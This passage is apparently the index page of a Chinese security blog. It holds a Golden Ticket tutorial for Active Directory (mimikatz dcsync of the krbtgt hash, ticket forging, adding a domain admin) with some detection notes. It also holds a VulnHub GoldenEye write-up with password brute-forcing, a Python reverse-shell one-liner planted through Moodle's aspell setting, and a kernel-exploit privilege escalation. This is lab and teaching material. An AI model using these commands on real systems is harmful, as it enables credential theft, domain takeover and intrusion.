<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Try &amp; Enjoy">
<meta property="og:type" content="website">
<meta property="og:title" content="SwanQ&#39;s Blue SKY">
<meta property="og:url" content="http://swanq.top/index.html">
<meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
<meta property="og:description" content="Try &amp; Enjoy">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="penetration, forensics, web, cyber security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://swanq.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>SwanQ's Blue SKY</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's Blue SKY</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">TO LIVE IS TO RISK IT ALL</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">49</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">22</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/05/%E9%87%91%E7%A5%A8/" class="post-title-link" itemprop="url">域渗透提权维权之金票</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-05 14:28:21" itemprop="dateCreated datePublished" datetime="2021-07-05T14:28:21+08:00">2021-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-07 16:31:35" itemprop="dateModified" datetime="2021-07-07T16:31:35+08:00">2021-07-07</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票</p>
<h1 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h1><table>
<thead>
<tr>
<th align="center">ROLE</th>
<th align="center">IP</th>
<th align="center">OS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DC域控</td>
<td align="center">10.xx.xx.xx</td>
<td align="center">2012</td>
</tr>
</tbody></table>
<h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
<li><p><strong>域名</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li>
<li><p><strong>域的SID值</strong>     </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/2.png"></p>
<blockquote>
<p>SID：500代表管理员</p>
</blockquote>
</li>
<li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure></li>
<li><p><strong>伪造任意域管账号</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test password /add /domain</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="0x01-获取域SID及krbtgt的HTLM-hash"><a href="#0x01-获取域SID及krbtgt的HTLM-hash" class="headerlink" title="0x01.获取域SID及krbtgt的HTLM-hash"></a>0x01.获取域SID及krbtgt的HTLM-hash</h1><p>先在DC上新建一个实验用户swanq,此攻击都是基于在域控机子上的普通域内账户.即普通域内账户没有创建域管账户的权限或提升普通用户权限，而利用黄金票据可以做到</p>
<p>获取SID</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg"></p>
<p>mimikatz获取域控SID及krbtgt的NTLMhash.可在域控或在登陆过域控账户的域成员上获取</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/3.png"></p>
<blockquote>
<p><strong>dcsync</strong></p>
<p>概述：mimikatz功能，可模拟DC域控并从DC中导出帐户密码的hash</p>
<p>详解：</p>
<ul>
<li><p>在dcsync出现之前，要想获得域用户的hash，必须得先登录域控+在域控上执行代码后才可以获得域用户的哈希。而mimikatz增加的dcsync功能，可以模仿域控从真实的域控当中请求数据。</p>
</li>
<li><p>dcsync特点在于不用登录服务器，就可以远程通过域数据同步复制的方式获得想要的用户口令。</p>
</li>
</ul>
</blockquote>
<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/12.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge   </span><br></pre></td></tr></table></figure>

<p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能离线生成金票ticket.kiribi伪造TGT</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:swanq /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
<h1 id="0x03-票据利用"><a href="#0x03-票据利用" class="headerlink" title="0x03.票据利用"></a>0x03.票据利用</h1><p>查看本地保存的票据,确认无误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/8.png"></p>
<p>或者klist也可</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/13.png"></p>
<p>将伪造的黄金票据导入内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::ptt ticket.kiribi</span><br></pre></td></tr></table></figure>

<p>此时可以直接将DC的C盘映射到本地h盘，进行访问，访问有两种方式：</p>
<p>其一</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/14.png"></p>
<p>其二</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/15.png"></p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/9.png"></p>
<p>入DC检查</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/16.png"></p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/17.png"></p>
<p>除了映射之外也可直接添加域管账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use username password &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>

<p>入DC检查</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/10.png"></p>
<p>不过此域管账户并没有本地登录权限，还是需要加入administrator组</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/11.png"></p>
<h1 id="0x04-检测及清理"><a href="#0x04-检测及清理" class="headerlink" title="0x04.检测及清理"></a>0x04.检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h2><ol>
<li>伪造自己是administrator，此时日志无法检测，但是可以检测是否在常用IP段出现。</li>
<li>用wireshark可以看到认证流程只有4769-&gt;4624</li>
</ol>
<h2 id="清理："><a href="#清理：" class="headerlink" title="清理："></a>清理：</h2><ol>
<li>即时修改krbtgt账号密码，且需修改两次。</li>
<li>官方有重置密码的脚本，建议定期重置：<a target="_blank" rel="noopener" href="https://github.com/microsoft/New-KrbtgtKeys.ps1">https://github.com/microsoft/New-KrbtgtKeys.ps1</a></li>
</ol>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ol>
<li>正常的认证访问服务触发事件顺序为:<strong>4768（TGT）-4769（TGS）-4624（logon）</strong></li>
<li>mimikatz在win2003及以下导入黄金票据报错</li>
<li>事件4624-登录</li>
<li>事件4672-特殊登录：SYSTEM（本地系统）帐户的每次登录都会触发此事件,属正常事件</li>
<li>eventvwr打开windows事件查看器</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>chz-大佬竟在我身边：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385465988">https://zhuanlan.zhihu.com/p/385465988</a></li>
<li>域控是最高级，域管是任何被域控加入域管的域成员</li>
<li>新建域用户之后，需要给域用户配置隶属于管理员的权限，才允许本地登录：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43760829/article/details/89437363">https://blog.csdn.net/weixin_43760829/article/details/89437363</a></li>
<li>远程桌面命令行指令：mstsc(Microsoft Terminal Server Connection)</li>
<li>需要熟悉Active Directory 用户和计算机、组策略管理</li>
<li><a target="_blank" rel="noopener" href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C</a></li>
<li>存在错误但为主要参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></li>
<li>mimikatz详情：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/02/vulnHub-Lampiao/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/02/vulnHub-Lampiao/" class="post-title-link" itemprop="url">vulnHub靶机系列：shentouLampiao渗透Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-02 18:13:58" itemprop="dateCreated datePublished" datetime="2021-07-02T18:13:58+08:00">2021-07-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-05 09:19:54" itemprop="dateModified" datetime="2021-07-05T09:19:54+08:00">2021-07-05</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>Would you like to keep hacking in your own lab?</p>
<p>Try this brand new vulnerable machine! “Lampião 1”.</p>
<p>Get root!</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本靶场目标：获取root权限</p>
<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.221.136</p>
<p>攻击机：kali 192.168.221.130</p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.221.0/24</span><br></pre></td></tr></table></figure>



<h2 id="端口及服务扫描"><a href="#端口及服务扫描" class="headerlink" title="端口及服务扫描"></a>端口及服务扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.221.136</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/1.png"></p>
<p>22：ssh</p>
<p>80</p>
<p>1898：apache 2.4.7</p>
<p>还有一个服务识别不了，返回数据</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\3.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\4.png"></p>
<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>成功ping通，访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\5.png"></p>
<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到terminal.js。</p>
<p>通过报错信息也可看到中间件为apache</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\6.png"></p>
<p>访问terminal.js看到以下信息</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\7.png"></p>
<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\8.png"></p>
<blockquote>
<p>加密格式总结：</p>
<ul>
<li>Unicode：\u开头</li>
<li>UTF8/URL：%开头</li>
<li>UTF16：\x开头</li>
<li>&amp;#73;：　73为ASCII码，对应I</li>
</ul>
</blockquote>
<p>靶机在某个较高端口上开了pop3服务，此处指55007。pop3为邮件服务器</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\9.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\10.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\19.png"></p>
<p>terminal.js中写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,暴力破解</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\11.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\12.png"></p>
<p>密码为 secret1!</p>
<p>通过nc telnet连接pop3，登陆并查看boris的邮件信息</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\13.png"></p>
<p>其中三封邮件内容如下，</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\14.png"></p>
<p>root发给boris的邮件</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\15.png"></p>
<p>natalya发给boris的邮件</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\16.png"></p>
<p>alec发给boris的邮件</p>
<p>再查看natalya的邮件有什么信息。</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\17.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\18.png"></p>
<p>得到用户名密码、服务器域名和网址，可在/etc/hosts可添加信息后访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Domain: severnaya-station.com&#x2F;gnocertdir</span><br><span class="line"></span><br><span class="line">point this servers IP to severnaya-station.com in &#x2F;etc&#x2F;hosts.</span><br></pre></td></tr></table></figure>

<p>打开本机/etc/hosts。添加域信息</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\20.png"></p>
<p>登陆网站看到登陆框，此处是一个开源的CMS系统moodle，用刚才得到的用户名和密码登陆即可</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\21.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\22.png"></p>
<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\23.png"></p>
<p>知道用户名继续hydra爆破，登陆邮件服务器：</p>
<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
<p>靶机：GoldenEye 192.168.221.128</p>
<p>攻击机：kali 192.168.221.130</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\24.png"></p>
<p>得到doak的CMS的账户密码：</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\25.png"></p>
<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\26.png"></p>
<p>找到一个jpg文件位于以下位置：</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\27.png"></p>
<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\28.png"></p>
<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
<p>账号：admin</p>
<p>密码：xWinter1995x!</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\29.png"></p>
<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><h2 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h2><p>已知Moodle版本为2.2.3。可能存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\30.png"></p>
<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>首先Home -&gt; Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor，将Spell engine更换为PSpellShell。</p>
<p>在Home -&gt; Site administration -&gt; Server -&gt; System paths的Path to aspell处上传代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.187.128&quot;,8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<p>监听本机8099端口</p>
<p>并在Home -&gt; My profile -&gt; Blogs -&gt; Add a new entry中新建blog，输入任意字符，点Toggle Spellchecker。即可监听成功</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\33.png"></p>
<p>靶机上有python 考虑用python获取TTY，否则无法执行某些命令，并查看用户名、内核信息和ID</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\34.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>根据之前获取的内核版本在Exploit-DB中找EXP</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\35.png"></p>
<h2 id="37292-c提权"><a href="#37292-c提权" class="headerlink" title="37292.c提权"></a>37292.c提权</h2><p>建立HTTP服务传输EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m  http.server 8000</span><br></pre></td></tr></table></figure>

<p>进入靶机/tmp目录下载EXP</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\36.png"></p>
<p>执行后提示gcc并没有安装，更改EXPgcc为cc编译</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\40.png"></p>
<p>然后重新下载shell并编译</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\37.png"></p>
<p>运行EXP成功提权，在root目录下找到.flag.txt，注意不是flag.txt</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\38.png"></p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\39.png"></p>
<p>we get it!</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\41.png"></p>
<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
<li><p>此处apache中间件无用武之地</p>
</li>
<li><p>用户名小写我是没想到</p>
</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
<li>文章参考：<a target="_blank" rel="noopener" href="https://programmersought.com/article/93378040168/#_252">https://programmersought.com/article/93378040168/#_252</a></li>
<li><a target="_blank" rel="noopener" href="https://www.shawroot.cc/1842.html">https://www.shawroot.cc/1842.html</a></li>
<li>nc实现telnet连接pop3：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
<li>aspell参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
<li>tty-teletypewriter：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000038466327">https://segmentfault.com/a/1190000038466327</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/01/base-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/01/base-64/" class="post-title-link" itemprop="url">base64解决terminal之间编码不同的问题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

